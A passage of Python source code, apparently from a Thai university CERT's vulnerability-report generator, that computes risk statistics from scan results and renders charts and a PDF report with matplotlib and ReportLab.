        meta = {"opts": json_data.get("scan_opts"), "duration": json_data.get("duration_sec"),
                "tool": json_data.get("tool_version")}
        return {"target": target, "scan_date": scan_date,
                "fingerprint": reachable[0].get("fingerprint", {}) if reachable else {},
                "cms": reachable[0].get("cms", {}) if reachable else {},
                "all_results": all_results, "hosts": hosts, "scan_meta": meta,
                "targets_count": len(results), "reachable_count": len(reachable),
                "is_multi": True}

    # single-target
    h = build_host(json_data, True)
    meta = {"opts": json_data.get("scan_opts"), "duration": json_data.get("duration_sec"),
            "tool": json_data.get("tool_version")}
    return {"target": json_data.get("target", "Unknown"), "scan_date": scan_date,
            "fingerprint": json_data.get("fingerprint", {}), "cms": json_data.get("cms", {}),
            "all_results": h["findings"], "hosts": [h], "scan_meta": meta, "targets_count": 1,
            "reachable_count": 1, "is_multi": False}


def _compute_stats(data):
    results = data.get("all_results", [])
    s = {"total": len(results), "detected": 0, "applicable": 0,
         "safe": 0, "vulnerable": 0, "warning": 0, "unknown": 0,
         "by_category": {}, "by_severity": {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0},
         # การกระจายเฉพาะรายการที่ "ตรวจพบจริง" (ยืนยันเสี่ยง + พบสัญญาณเสี่ยง) — ใช้กับกราฟ/สรุป
         "by_severity_impact": {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0},
         "by_category_impact": {}}
    for r in results:
        st = r.get("status", "unknown")
        if st != "n/a":
            s["applicable"] += 1
        cat = r.get("category", "Other")
        b = _bucket_of(st)
        s["by_category"].setdefault(cat, {"total": 0, "safe": 0, "vulnerable": 0, "warning": 0, "unknown": 0})
        s["by_category"][cat]["total"] += 1
        s[b] += 1
        s["by_category"][cat][b] += 1
        sev_raw = r.get("severity", "")
        sk = _sev_key(sev_raw)
        s["by_severity"][sk] += 1
        if b in ("vulnerable", "warning"):
            s["by_severity_impact"][sk] += 1
            s["by_category_impact"][cat] = s["by_category_impact"].get(cat, 0) + 1

    exposed = s["vulnerable"] + s["warning"]
    s["detected"] = exposed
    s["exposure_pct"] = int(round(100.0 * exposed / max(1, s["applicable"] or s["total"]))) if s["total"] else 0

    # per-host roll-up
    hosts = data.get("hosts", [])
    reach = [h for h in hosts if h.get("reachable")]
    # ดัชนีความเสี่ยงรวม (0–100): ใช้ค่าสูงสุดของโฮสต์ที่สแกนพบ เพื่อไม่ให้โฮสต์ปลอดภัยจำนวนมากมาหารเฉลี่ยจนความเสี่ยงวิกฤตหายไป
    s["risk_score"] = max((h.get("risk_score", 0) for h in reach), default=0)
    s["hosts_total"] = len(hosts)
    s["hosts_reachable"] = len(reach)
    s["hosts_vulnerable"] = sum(1 for h in reach if h["counts"]["vulnerable"] > 0)
    s["hosts_warning"] = sum(1 for h in reach if h["counts"]["vulnerable"] == 0 and h["counts"]["warning"] > 0)
    s["hosts_unknown"] = sum(1 for h in reach if h["risk_level"] == "unknown")
    s["hosts_safe"] = sum(1 for h in reach if h["risk_level"] == "safe")
    s["hosts_unreachable"] = len(hosts) - len(reach)

    # ── A1/A2/A4: สรุป Security headers / cookie / banner ──
    from collections import Counter as _C
    hdr_missing = _C()
    cookie_bad = 0
    banner_disc = 0
    hosts_with_hdr = 0
    for h in reach:
        a = h.get("hdr")
        if not a:
            continue
        hosts_with_hdr += 1
        for hk, _desc in a["missing"]:
            hdr_missing[hk] += 1
        if a["cookie_issues"]:
            cookie_bad += 1
        if a["disclosed"]:
            banner_disc += 1
    s["hdr_hosts"] = hosts_with_hdr
    s["hdr_missing"] = hdr_missing
    s["cookie_bad"] = cookie_bad
    s["banner_disc"] = banner_disc
    # ── A3: ใบรับรอง/TLS ──
    s["cert_expiring"] = sum(1 for h in reach if isinstance(h.get("cert_days_left"), int)
                             and 0 <= h["cert_days_left"] <= 30)
    s["cert_expired"] = sum(1 for h in reach if isinstance(h.get("cert_days_left"), int)
                            and h["cert_days_left"] < 0)
    s["cert_problem"] = sum(1 for h in reach if h.get("cert_problem"))
    # ── A6: แยกเหตุผลของ "ยังสรุปไม่ได้" ──
    s["unknown_hidden"] = sum(1 for h in reach if h["risk_level"] == "unknown"
                              and (h.get("server", "").endswith(("?", "NGINX", "Apache", "IIS", "LiteSpeed"))
                                   or not any(c.isdigit() for c in h.get("server", ""))))
    # ── B9: สินทรัพย์สำคัญสูงที่มีความเสี่ยง ──
    s["crit_assets_at_risk"] = sum(1 for h in reach
                                   if h.get("crit_asset", 1) >= 2 and h["risk_level"] in ("critical", "warning"))

    if s["total"] == 0:
        lvl = "unknown" if data.get("is_multi") else "safe"
    elif s["risk_score"] >= 70 or s["vulnerable"] > 0:
        lvl = "critical"
    elif s["risk_score"] >= 40 or s["warning"] > 0:
        lvl = "warning"
    elif s["unknown"] > 0:
        lvl = "unknown"
    else:
        lvl = "safe"
    s["risk_level"] = lvl

    if data.get("is_multi"):
        detail_map = {
            "critical": f"พบ {s['hosts_vulnerable']} โฮสต์ที่ยืนยันว่าเสี่ยง จาก {s['hosts_reachable']} โฮสต์ที่เข้าถึงได้",
            "warning": f"มี {s['hosts_warning']} โฮสต์ที่เข้าเงื่อนไขเสี่ยง ควรยืนยันบนเครื่อง",
            "unknown": (f"เข้าถึงได้ {s['hosts_reachable']} โฮสต์ แต่ยืนยันช่องโหว่จากภายนอกไม่ได้"
                        if s["hosts_reachable"] else
                        f"สแกน {s['hosts_total']} เป้าหมาย แต่ไม่พบโฮสต์ที่เข้าถึงได้ (ออฟไลน์/ปิดพอร์ต)"),
            "safe": f"เข้าถึงได้ {s['hosts_reachable']} โฮสต์ ไม่พบช่องโหว่ที่ยืนยันได้",
        }
    else:
        detail_map = {
            "critical": f"พบ {s['vulnerable']} รายการที่ยืนยันว่าเสี่ยง จากทั้งหมด {s['total']} รายการ",
            "warning": f"มี {s['warning']} รายการที่เข้าเงื่อนไขเสี่ยง ควรตรวจสอบบนเครื่องจริง",
            "unknown": f"{s['unknown']} รายการตรวจจากภายนอกไม่ได้ ไม่ได้แปลว่าปลอดภัย",
            "safe": "ผลการตรวจจากภายนอกอยู่ในเกณฑ์ปลอดภัย — ควรอัปเดตสม่ำเสมอ",
        }
    headlines = {"critical": "ความเสี่ยงสูง — ต้องแก้ไขทันที",
                 "warning": "ความเสี่ยงปานกลาง — ควรยืนยันและแก้ไข",
                 "unknown": "ยังสรุปไม่ได้ — ต้องยืนยันบนเครื่อง",
                 "safe": "ไม่พบช่องโหว่ที่ยืนยันได้"}
    s["verdict"] = {"level": lvl, "headline": headlines[lvl], "detail": detail_map[lvl]}
    data["stats"] = s
    return data


# ─────────────────────────── CHARTS ───────────────────────────

def _chart_gauge(data, path, thai):
    score = data["stats"]["risk_score"]
    lvl = data["stats"]["risk_level"]
    color = {"critical": PALETTE["vuln"], "warning": PALETTE["warn"],
             "unknown": PALETTE["unknown"], "safe": PALETTE["safe"]}[lvl]
    import numpy as np
    fig, ax = plt.subplots(figsize=(6, 3.6), subplot_kw={"aspect": "equal"})
    # ช่วงเกณฑ์มาตรฐาน CVSS v3.1 (คูณ 10): 0–39 (Low/Safe), 40–69 (Medium/Warning), 70–100 (High/Critical)
    for lo, hi, col in [(0, 39, PALETTE["safe"]), (39, 69, PALETTE["warn"]), (69, 100, PALETTE["vuln"])]:
        a0 = np.pi * (1 - lo / 100.0)
        a1 = np.pi * (1 - hi / 100.0)
        t = np.linspace(a0, a1, 60)
        ax.plot(np.cos(t), np.sin(t), lw=18, color=col, solid_capstyle="butt", alpha=0.25)
    a_end = np.pi * (1 - score / 100.0)
    t = np.linspace(np.pi, a_end, max(2, int(score * 2)))
    ax.plot(np.cos(t), np.sin(t), lw=18, color=color, solid_capstyle="round")
    ax.text(0, -0.08, str(score), ha="center", va="center", fontsize=46, fontweight="bold", color=color)
    ax.text(0, -0.42, ("คะแนนความเสี่ยงรวม (0–100)" if thai else "Risk Score (0–100)"),
            ha="center", va="center", fontsize=12, color=PALETTE["muted"])
    ax.set_xlim(-1.2, 1.2); ax.set_ylim(-0.55, 1.15); ax.axis("off")
    fig.tight_layout(); fig.savefig(path, dpi=150, bbox_inches="tight"); plt.close(fig)


def _chart_hosts(data, path, thai):
    """ภาพรวมโฮสต์: เสี่ยง / อาจเสี่ยง / ไม่ทราบ / ปลอดภัย / เข้าไม่ถึง (มีข้อมูลเสมอในโหมดหลายโฮสต์)"""
    s = data["stats"]
    labels = ["เสี่ยง", "อาจเสี่ยง", "ไม่ทราบ", "ปลอดภัย", "เข้าไม่ถึง"] if thai else \
             ["Vulnerable", "Warning", "Unknown", "Safe", "Unreachable"]
    vals = [s["hosts_vulnerable"], s["hosts_warning"], s["hosts_unknown"], s["hosts_safe"], s["hosts_unreachable"]]
    clrs = [PALETTE["vuln"], PALETTE["warn"], PALETTE["unknown"], PALETTE["safe"], "#c7ccd6"]
    fig, ax = plt.subplots(figsize=(7, 4))
    bars = ax.barh(labels, vals, color=clrs, edgecolor="white", height=0.62)
    ax.invert_yaxis()
    mx = max(vals + [1])
    for b, v in zip(bars, vals):
        if v:
            ax.text(b.get_width() + mx * 0.02, b.get_y() + b.get_height() / 2, str(v),
                    va="center", fontweight="bold", color=PALETTE["text"])
    ax.set_xlim(0, mx * 1.18)
    ax.grid(axis="y", visible=False)
    for sp in ("top", "right", "left"):
        ax.spines[sp].set_visible(False)
    ax.set_title(f"ภาพรวมโฮสต์ · นับรายเครื่อง (ทั้งหมด {s['hosts_total']})" if thai else f"Hosts overview ({s['hosts_total']})")
    fig.tight_layout(); fig.savefig(path, dpi=150, bbox_inches="tight"); plt.close(fig)


def _chart_severity(data, path, thai):
    # นับเฉพาะรายการที่มีผลกระทบจริง (เสี่ยง/อาจเสี่ยง) — ไม่รวม "ไม่ทราบ"
    sev = data["stats"].get("by_severity_impact") or data["stats"]["by_severity"]
    labels, vals, clrs = [], [], []
    for k in ["Critical", "High", "Medium", "Low", "Info"]:
        if sev[k] > 0:
            labels.append(k); vals.append(sev[k]); clrs.append(SEV_PALETTE[k])
    fig, ax = plt.subplots(figsize=(6, 4.6))
    if vals:
        wedges, _, autos = ax.pie(
            vals, labels=None, autopct=lambda p: f"{int(round(p * sum(vals) / 100))}",
            colors=clrs, startangle=90, pctdistance=0.78,
            wedgeprops={"width": 0.42, "edgecolor": "white", "linewidth": 2})
        for a in autos:
            a.set_color("white"); a.set_fontweight("bold"); a.set_fontsize(11)
        ax.text(0, 0, f"{sum(vals)}\n{'รายการ' if thai else 'items'}", ha="center", va="center",
                fontsize=15, fontweight="bold", color=PALETTE["ink"])
        ax.legend(wedges, labels, loc="center left", bbox_to_anchor=(1.0, 0.5), frameon=False, fontsize=10)
    else:
        ax.text(0.5, 0.5, "ไม่มีข้อมูล" if thai else "No data", ha="center", va="center",
                color=PALETTE["muted"]); ax.axis("off")
    ax.set_title("สัดส่วนความรุนแรง" if thai else "Severity Distribution")
    fig.tight_layout(); fig.savefig(path, dpi=150, bbox_inches="tight"); plt.close(fig)


def _chart_status(data, path, thai):
    s = data["stats"]
    buckets = ["vulnerable", "warning", "unknown", "safe"]
    vals = [s[b] for b in buckets]
    clrs = [PALETTE["vuln"], PALETTE["warn"], PALETTE["unknown"], PALETTE["safe"]]
    labels = [BUCKET_LABELS[b] if thai else b.capitalize() for b in buckets]
    fig, ax = plt.subplots(figsize=(7, 4))
    bars = ax.barh(labels, vals, color=clrs, edgecolor="white", height=0.62)
    ax.invert_yaxis()
    mx = max(vals + [1])
    for b, v in zip(bars, vals):
        if v:
            ax.text(b.get_width() + mx * 0.02, b.get_y() + b.get_height() / 2, str(v),
                    va="center", fontweight="bold", color=PALETTE["text"])
    ax.set_xlim(0, mx * 1.18)
    ax.grid(axis="y", visible=False)
    for sp in ("top", "right", "left"):
        ax.spines[sp].set_visible(False)
    ax.set_title("สถานะรายการตรวจ CVE · นับรายหัวข้อ" if thai else "Findings by Status (per check)")
    fig.tight_layout(); fig.savefig(path, dpi=150, bbox_inches="tight"); plt.close(fig)


def _chart_category(data, path, thai):
    by = data["stats"]["by_category"]
    if not by:
        return False
    # นับเฉพาะที่มีผลกระทบ (เสี่ยง+อาจเสี่ยง) ต่อประเภท แล้วตัดประเภทที่เหลือ 0 ออก
    labels = [k for k in by.keys() if (by[k].get("vulnerable", 0) + by[k].get("warning", 0)) > 0]
    if not labels:
        return False
    vals = [by[k].get("vulnerable", 0) + by[k].get("warning", 0) for k in labels]
    cmap = {"PHP": PALETTE["php"], "NGINX": PALETTE["nginx"], "Node.js": PALETTE["node"], "Other": PALETTE["other"]}
    fig, ax = plt.subplots(figsize=(5.4, 4.6))
    wedges, _, autos = ax.pie(
        vals, labels=labels, autopct=lambda p: f"{int(round(p * sum(vals) / 100))}",
        colors=[cmap.get(k, PALETTE["other"]) for k in labels], startangle=90, pctdistance=0.74,
        wedgeprops={"width": 0.42, "edgecolor": "white", "linewidth": 2},
        textprops={"fontsize": 11, "color": PALETTE["text"]})
    for a in autos:
        a.set_color("white"); a.set_fontweight("bold")
    ax.text(0, 0, f"{sum(vals)}\nCVE", ha="center", va="center", fontsize=15,
            fontweight="bold", color=PALETTE["ink"])
    ax.set_title("แยกตามประเภท" if thai else "CVE by Category")
    fig.tight_layout(); fig.savefig(path, dpi=150, bbox_inches="tight"); plt.close(fig)
    return True


def _chart_stacked(data, path, thai):
    by = data["stats"]["by_category"]
    if not by:
        return False
    cats = sorted(by.keys())
    vuln = [by[c]["vulnerable"] for c in cats]
    warn = [by[c]["warning"] for c in cats]
    unk = [by[c]["unknown"] for c in cats]
    safe = [by[c]["safe"] for c in cats]
    fig, ax = plt.subplots(figsize=(7, 4))
    x = range(len(cats))
    ax.bar(x, vuln, label=("เสี่ยง" if thai else "Vulnerable"), color=PALETTE["vuln"])
    ax.bar(x, warn, bottom=vuln, label=("อาจเสี่ยง" if thai else "Warning"), color=PALETTE["warn"])
    b2 = [a + b for a, b in zip(vuln, warn)]
    ax.bar(x, unk, bottom=b2, label=("ไม่ทราบ" if thai else "Unknown"), color=PALETTE["unknown"])
    b3 = [a + b for a, b in zip(b2, unk)]
    ax.bar(x, safe, bottom=b3, label=("ปลอดภัย" if thai else "Safe"), color=PALETTE["safe"])
    ax.set_xticks(list(x)); ax.set_xticklabels(cats)
    ax.grid(axis="x", visible=False)
    for sp in ("top", "right"):
        ax.spines[sp].set_visible(False)
    ax.set_title("สถานะแยกตามประเภท" if thai else "Status by Category")
    ax.legend(loc="upper center", bbox_to_anchor=(0.5, -0.08), ncol=4, frameon=False, fontsize=9)
    fig.tight_layout(); fig.savefig(path, dpi=150, bbox_inches="tight"); plt.close(fig)
    return True


def _chart_tophosts(data, path, thai):
    """Top โฮสต์เสี่ยงที่สุด (แนวนอน) — เฉพาะโหมดหลายโฮสต์"""
    reach = [h for h in data["hosts"] if h.get("reachable") and h["risk_score"] > 0]
    if not reach:
        return False
    reach = sorted(reach, key=lambda h: (_RISK_ORDER.get(h["risk_level"], 9),
                                         -h.get("max_cvss", 0), -h["risk_score"]))[:10]
    labels = [h["host"][:34] for h in reach][::-1]
    vals = [h["risk_score"] for h in reach][::-1]
    clrs = [{"critical": PALETTE["vuln"], "warning": PALETTE["warn"],
             "unknown": PALETTE["unknown"], "safe": PALETTE["safe"]}.get(h["risk_level"], PALETTE["unknown"])
            for h in reach][::-1]
    fig, ax = plt.subplots(figsize=(7, max(3, 0.52 * len(labels) + 1.2)))
    bars = ax.barh(labels, vals, color=clrs, edgecolor="white", height=0.6)
    for b, v in zip(bars, vals):
        ax.text(b.get_width() + 1.5, b.get_y() + b.get_height() / 2, str(v),
                va="center", fontsize=9, color=PALETTE["muted"])
    ax.set_xlim(0, 108)
    ax.grid(axis="y", visible=False)
    for sp in ("top", "right", "left"):
        ax.spines[sp].set_visible(False)
    ax.set_title("โฮสต์ที่เสี่ยงที่สุด (คะแนน 0–100)" if thai else "Most at-risk hosts")
    fig.tight_layout(); fig.savefig(path, dpi=150, bbox_inches="tight"); plt.close(fig)
    return True


def _chart_toprisk(data, path, thai):
    ranked = []
    for r in data["all_results"]:
        b = _bucket_of(r.get("status", "unknown"))
        if b == "safe":
            continue
        sev = r.get("severity", "").split("(")[0].strip()
        w = _SEV_WEIGHT.get(sev, 1.0) * _BUCKET_FACTOR.get(b, 0.0)
        if w > 0:
            ranked.append((r.get("cve", "?"), w, b))
    # รวมคะแนนตาม CVE (กรณีหลายโฮสต์ CVE เดียวกันโผล่ซ้ำ)
    agg = {}
    for cve, w, b in ranked:
        if cve not in agg or w > agg[cve][0]:
            agg[cve] = (w, b)
    items = sorted(agg.items(), key=lambda kv: kv[1][0], reverse=True)[:8]
    if not items:
        return False
    labels = [k for k, _ in items][::-1]
    vals = [v[0] for _, v in items][::-1]
    clrs = [{"vulnerable": PALETTE["vuln"], "warning": PALETTE["warn"],
             "unknown": PALETTE["unknown"]}[v[1]] for _, v in items][::-1]
    fig, ax = plt.subplots(figsize=(7, max(3, 0.52 * len(labels) + 1.2)))
    bars = ax.barh(labels, vals, color=clrs, edgecolor="white", height=0.6)
    mx = max(vals + [1])
    for b, v in zip(bars, vals):
        ax.text(b.get_width() + mx * 0.02, b.get_y() + b.get_height() / 2, f"{v:.1f}",
                va="center", fontsize=9, color=PALETTE["muted"])
    ax.set_xlim(0, mx * 1.15)
    ax.grid(axis="y", visible=False)
    for sp in ("top", "right", "left"):
        ax.spines[sp].set_visible(False)
    ax.set_title("ลำดับความเสี่ยงที่ควรจัดการก่อน" if thai else "Top Risks to Address")
    fig.tight_layout(); fig.savefig(path, dpi=150, bbox_inches="tight"); plt.close(fig)
    return True


def _chart_thaicert(data, path, thai):
    """แท่งแนวนอน: จำนวนโฮสต์ที่ตรวจพบในแต่ละกลุ่ม ThaiCERT ทั้ง 8 กลุ่ม
    สีแท่ง = เพดานความสามารถตรวจจากภายนอก (เขียว≥70 / เหลือง≥45 / แดง<45)"""
    tc = _thaicert_coverage(data)
    if not tc:
        return False
    tc = list(tc)[::-1]  # กลุ่ม 1 อยู่บนสุด
    labels = [f"{x['no']}. " + (x["name"][:30] + ("…" if len(x["name"]) > 30 else "")) for x in tc]
    vals = [x["hosts"] for x in tc]
    clrs = [(PALETTE["safe"] if x["cap"] >= 70 else (PALETTE["warn"] if x["cap"] >= 45 else PALETTE["vuln"]))
            for x in tc]
    fig, ax = plt.subplots(figsize=(7.2, 4.4))
    bars = ax.barh(labels, vals, color=clrs, edgecolor="white", height=0.64)
    mx = max(vals + [1])
    for b, x in zip(bars, tc):
        txt = f"{x['hosts']} โฮสต์" if x["hosts"] else "—"
        ax.text(b.get_width() + mx * 0.02, b.get_y() + b.get_height() / 2,
                f"{txt}  ({x['cap']}%)", va="center", fontsize=8.5, color=PALETTE["muted"])
    ax.set_xlim(0, mx * 1.28)
    ax.grid(axis="y", visible=False)
    for sp in ("top", "right", "left"):
        ax.spines[sp].set_visible(False)
    ax.set_title("ตรวจพบตาม 8 กลุ่มระบบ ThaiCERT · จำนวนโฮสต์ (สีแท่ง = เพดานความสามารถตรวจ)"
                 if thai else "Detections by ThaiCERT 8 groups")
    fig.tight_layout(); fig.savefig(path, dpi=150, bbox_inches="tight"); plt.close(fig)
    return True


# ─────────────────────────── PDF ───────────────────────────

def _build_pdf(data, charts, output_path, font):
    doc = SimpleDocTemplate(output_path, pagesize=A4, topMargin=1.6 * cm, bottomMargin=1.6 * cm,
                            leftMargin=1.5 * cm, rightMargin=1.5 * cm, title="RMUT CERT Vulnerability Report")
    styles = getSampleStyleSheet()

    try:
        pdfmetrics.getFont(font + "-Bold")
        _bold_font = font + "-Bold"
    except Exception:
        _bold_font = font

    def st(n, **k):
        k.setdefault("fontName", font)
        return ParagraphStyle(n, parent=styles["BodyText"], **k)

    GREY = colors.HexColor("#555b66")
    title = st("T", fontSize=24, leading=30, textColor=RMUT_BLUE, alignment=TA_CENTER, spaceAfter=4)
    sub = st("S", fontSize=12.5, leading=16, textColor=GREY, alignment=TA_CENTER, spaceAfter=18)
    h1 = st("H1", fontSize=16, leading=21, textColor=RMUT_BLUE, spaceBefore=12, spaceAfter=6)
    h2 = st("H2", fontSize=12.5, leading=16, textColor=colors.HexColor("#283593"), spaceBefore=10, spaceAfter=5)
    body = st("B", fontSize=10.3, leading=15)
    note = st("N", fontSize=9, leading=13, textColor=GREY)
    cell = st("C", fontSize=8, leading=11)
    cellb = st("CB", fontSize=8.5, leading=11)
    cellw = st("CW", fontSize=8.5, leading=11, textColor=colors.white)   # หัวตารางสีขาว
    cellwh = st("CWH", fontSize=8, leading=10, textColor=colors.white)   # หัวตารางสีขาว (เล็ก)

    def P(t, s=None):
        return Paragraph(str(t), s or body)

    # ── ตัวนับบทอัตโนมัติ (ไม่พังเมื่อบางบทถูกข้ามในโหมดโฮสต์เดี่ยว) ──
    _chap = {"n": 0}
    def H1(t):
        _chap["n"] += 1
        return P(f"บทที่ {_chap['n']} · {t}", h1)
    def H1A(t):
        return P(f"ภาคผนวก · {t}", h1)

    # ── ตัววาดกราฟแท่งด้วย ReportLab เอง (ไม่ต้องพึ่ง matplotlib) ──
    def native_bars(items, total_w=15.4, label_w=3.6, val_w=1.4, title=None):
        bar_w = total_w - label_w - val_w
        mx = max([v for _, v, _ in items] + [1])
        rows = []
        for lab, val, col in items:
            fillw = max(0.04, bar_w * (val / mx)) if val > 0 else 0.04
            barcell = Table([[""]], colWidths=[fillw * cm], rowHeights=[0.42 * cm])
            barcell.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, -1), colors.HexColor(col))]))
            track = Table([[barcell]], colWidths=[bar_w * cm])
            track.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, -1), colors.HexColor("#eef0f5")),
                                       ("LEFTPADDING", (0, 0), (-1, -1), 0), ("RIGHTPADDING", (0, 0), (-1, -1), 0),
                                       ("TOPPADDING", (0, 0), (-1, -1), 1), ("BOTTOMPADDING", (0, 0), (-1, -1), 1),
                                       ("VALIGN", (0, 0), (-1, -1), "MIDDLE")]))
            rows.append([P(lab, st("bl", fontSize=9.5, leading=12)), track,
                         P(f"<b>{val}</b>", st("bv", fontSize=10, leading=12, alignment=TA_RIGHT))])
        t = Table(rows, colWidths=[label_w * cm, bar_w * cm, val_w * cm])
        t.setStyle(TableStyle([("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
                               ("TOPPADDING", (0, 0), (-1, -1), 2.5), ("BOTTOMPADDING", (0, 0), (-1, -1), 2.5),
                               ("LEFTPADDING", (0, 0), (0, -1), 0), ("RIGHTPADDING", (1, 0), (1, -1), 6)]))
        flow = []
        if title:
            flow.append(P(title, st("bt", fontSize=11, leading=15, textColor=RMUT_BLUE, spaceAfter=2)))
        flow.append(t)
        return flow

    def native_score_banner(score, level):
        col = {"critical": "#e03131", "warning": "#f08c00", "unknown": "#868e96", "safe": "#2e9e5b"}[level]
        big = P(f"<b>{score}</b>", st("bg", fontSize=40, leading=44, alignment=TA_CENTER, textColor=colors.HexColor(col)))
        capt = P("คะแนนความเสี่ยงรวม (0–100)", st("bgc", fontSize=10, leading=13, alignment=TA_CENTER, textColor=GREY))
        fill = Table([[""]], colWidths=[max(0.1, 0.16 * score) * cm], rowHeights=[0.5 * cm])
        fill.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, -1), colors.HexColor(col))]))
        track = Table([[fill]], colWidths=[16 * cm])
        track.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, -1), colors.HexColor("#eef0f5")),
                                   ("LEFTPADDING", (0, 0), (-1, -1), 0), ("RIGHTPADDING", (0, 0), (-1, -1), 0),
                                   ("TOPPADDING", (0, 0), (-1, -1), 0), ("BOTTOMPADDING", (0, 0), (-1, -1), 0)]))
        scale = Table([[P("0", st("s0", fontSize=8, textColor=GREY)),
                        P("ต่ำ/ปลอดภัย · 39", st("s1", fontSize=8, textColor=GREY, alignment=TA_CENTER)),
                        P("ปานกลาง · 69", st("s2", fontSize=8, textColor=GREY, alignment=TA_CENTER)),
                        P("สูง/วิกฤต · 100", st("s3", fontSize=8, textColor=GREY, alignment=TA_RIGHT))]],
                       colWidths=[4 * cm, 4 * cm, 4 * cm, 4 * cm])
        scale.setStyle(TableStyle([("LEFTPADDING", (0, 0), (-1, -1), 0), ("RIGHTPADDING", (0, 0), (-1, -1), 0)]))
        return [big, capt, Spacer(1, 0.15 * cm), track, scale]

    # จานสีที่แยกกันชัด (ใช้เมื่อแต่ละชิ้นต้องสีต่างกัน เช่น แยกตาม CVE)
    _DISTINCT = ["#c1121f", "#1971c2", "#f59f00", "#2f9e44", "#6741d9", "#e8590c",
                 "#0b8457", "#d6336c", "#1098ad", "#9c36b5", "#495057", "#8a6d00"]

    def native_pie(items, title=None, donut=True, center_label="โฮสต์", distinct=False):
        """กราฟโดนัทด้วย ReportLab เอง — items: [(label, value, hex)]
        distinct=True → บังคับให้ทุกชิ้นสีต่างกัน (แมปสีสไลซ์กับ legend ได้ตรงตัว)"""
        from reportlab.graphics.shapes import Drawing, String, Circle
        from reportlab.graphics.charts.piecharts import Pie
        items = [(l, v, c) for l, v, c in items if v > 0]
        total = sum(v for _, v, _ in items) or 1
        if distinct:
            items = [(l, v, _DISTINCT[i % len(_DISTINCT)]) for i, (l, v, _c) in enumerate(items)]
        n = max(1, len(items))
        # ความสูงของภาพปรับตามจำนวนรายการใน legend เพื่อไม่ให้ข้อความล้น/ทับกัน
        H = max(6.2 * cm, n * 0.62 * cm + 1.2 * cm)
        dmin = total * 0.025   # บังคับสไลซ์ > 0 ให้กว้างพอมองเห็น (ตัวเลขใน legend ยังเป็นค่าจริง)
        d = Drawing(16 * cm, H)
        size = 5.0 * cm
        pie = Pie()
        pie.x = 14; pie.y = (H - size) / 2.0
        pie.width = size; pie.height = size
        pie.data = [max(v, dmin) for _, v, _ in items]
        pie.labels = None
        pie.slices.strokeColor = colors.white
        pie.slices.strokeWidth = 2
        pie.sideLabels = False
        for i, (_, _, c) in enumerate(items):
            pie.slices[i].fillColor = colors.HexColor(c)
        d.add(pie)
        if donut:
            cx = pie.x + pie.width / 2.0; cy = pie.y + pie.height / 2.0
            d.add(Circle(cx, cy, pie.width * 0.26, fillColor=colors.white, strokeColor=colors.white))
            d.add(String(cx, cy + 2, str(total), fontName=font, fontSize=18,
                         fillColor=colors.HexColor(PALETTE["ink"]), textAnchor="middle"))
            d.add(String(cx, cy - 14, center_label, fontName=font, fontSize=9,
                         fillColor=colors.HexColor(PALETTE["muted"]), textAnchor="middle"))
        # legend: จัดชิดบน เว้นระยะเท่ากัน อยู่ภายในความสูง H เสมอ
        lx = 7.2 * cm
        step = 0.6 * cm
        ly = H - 0.55 * cm
        for lab, val, c in items:
            p = val * 100.0 / total
            pcts = "<1%" if 0 < p < 0.95 else f"{round(p)}%"
            d.add(Circle(lx + 5, ly + 3, 5, fillColor=colors.HexColor(c), strokeColor=colors.white))
            d.add(String(lx + 16, ly, f"{lab}  {val} ({pcts})", fontName=font, fontSize=10.5,
                         fillColor=colors.HexColor(PALETTE["text"])))
            ly -= step
        flow = []
        if title:
            flow.append(P(title, st("pt", fontSize=11, leading=15, textColor=RMUT_BLUE, spaceAfter=2)))
        flow.append(d)
        return flow

    s = data["stats"]
    multi = data.get("is_multi")
    lvlcolor = {"safe": colors.HexColor("#2e9e5b"), "warning": colors.HexColor("#f08c00"),
                "critical": colors.HexColor("#e03131"), "unknown": colors.HexColor("#868e96")}
    story = []

    # ═══ 1. COVER ═══
    story.append(Spacer(1, 1.5 * cm))
    story.append(P("RMUT CERT.", title))
    story.append(P("รายงานผลการตรวจสอบช่องโหว่ความปลอดภัย", sub))
    if charts.get("gauge") and os.path.exists(charts["gauge"]):
        story.append(Image(charts["gauge"], width=11 * cm, height=6.6 * cm))
    else:
        for fl in native_score_banner(s["risk_score"], s["risk_level"]):
            story.append(fl)
    story.append(Spacer(1, 0.3 * cm))

    v = s["verdict"]
    vc = lvlcolor[v["level"]]
    v_st = st("V", fontSize=16, leading=22, textColor=colors.white, alignment=TA_CENTER)
    vd_st = st("VD", fontSize=10.5, leading=15, textColor=colors.white, alignment=TA_CENTER)
    vbox = Table([[P(v["headline"], v_st)], [P(v["detail"], vd_st)]], colWidths=[16 * cm])
    vbox.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, -1), vc),
                              ("TOPPADDING", (0, 0), (-1, -1), 12), ("BOTTOMPADDING", (0, 0), (-1, -1), 12),
                              ("ROUNDEDCORNERS", [6, 6, 6, 6])]))
    story.append(vbox)
    story.append(Spacer(1, 0.7 * cm))

    scope = ("หลายโฮสต์ (Wildcard/CIDR/File List)" if s.get("hosts_total", 1) > 1 else "โฮสต์เดี่ยว (Single)")
    info = [["เป้าหมาย (Target)", data["target"]],
            ["ประเภทการสแกน", scope],
            ["วันที่ตรวจสอบ", data["scan_date"][:19].replace("T", " ")],
            ["จำนวนเป้าหมาย", f"{s['hosts_total']} (เข้าถึงได้ {s['hosts_reachable']}, เข้าไม่ถึง {s['hosts_unreachable']})"],
            ["รายการช่องโหว่ที่ตรวจพบจริง", f"{s.get('detected', s['vulnerable'] + s['warning'])} รายการ (ยืนยันเสี่ยง {s['vulnerable']} · พบสัญญาณ {s['warning']})"],
            ["รายการที่ใช้สแกนทั้งหมด", f"{s['total']} รายการ (เกี่ยวข้องกับเทคโนโลยีบนเครื่อง {s.get('applicable', s['total'])} รายการ)"],
            ["สัดส่วนที่พบความเสี่ยง", f"{s['exposure_pct']}%"]]
    t = Table([[P(a, cellb), P(b, cell)] for a, b in info], colWidths=[5 * cm, 11 * cm])
    t.setStyle(TableStyle([("BACKGROUND", (0, 0), (0, -1), RMUT_LIGHT), ("TEXTCOLOR", (0, 0), (0, -1), RMUT_BLUE),
                           ("LINEBELOW", (0, 0), (-1, -1), 0.4, colors.HexColor("#d6d9e6")),
